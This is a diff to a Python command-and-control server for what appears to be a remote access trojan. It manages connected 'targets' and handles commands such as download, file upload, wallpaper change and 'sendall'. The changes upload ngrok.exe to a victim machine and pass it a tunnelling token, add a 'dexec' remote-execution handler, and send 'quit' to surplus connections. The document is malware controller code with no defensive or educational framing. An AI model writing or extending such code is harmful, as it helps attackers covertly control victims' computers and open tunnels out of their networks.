@@ -221,9 +221,19 @@ def target_communication(target, ip):
 
             elif command == 'ngroksetup':
                 if isfile('scripts\\ngrok.exe') == True:
-                    upload_file(target, 'scripts\\ngrok.exe')
-                    reliable_send(target, 'some data')
-                    print('ngrok installed on target')
+                    print("[*] Uploading Ngrok.exe")
+                    try:
+                        upload_file(target, 'scripts\\ngrok.exe')
+                    except:
+                        print("[-] Error Uploading Ngrok")
+                    else:
+                        token = input("entre your ngrok token:")
+                        target.send(token.encode('utf-8'))
+                        print(target.recv(1024).decode())
+                        continue
+
+
+
                 else:
                     pass
             elif command[:8] == 'download':
@@ -307,6 +317,8 @@ def target_communication(target, ip):
                 targets.remove(target)
                 ips.remove(ip)
                 users.remove(users[num])
+            elif command[:5] == 'dexec':
+                print(target.recv(1024).decode('utf-8'))
 
 
             elif command[:10] == 'cwallpaper':
@@ -353,7 +365,7 @@ def accept_connections():
                 print((str(ip) + ' has connected!'))
                 clients += 1
             else:
-
+                reliable_send(target,"quit")
                 pass
 
 
@@ -441,6 +453,7 @@ while True:
         targets.remove(targ)
         ips.remove(ip)
         users.remove(int(command[5:]))
+
 
     elif command[:7] == 'sendall':
         x = len(targets)
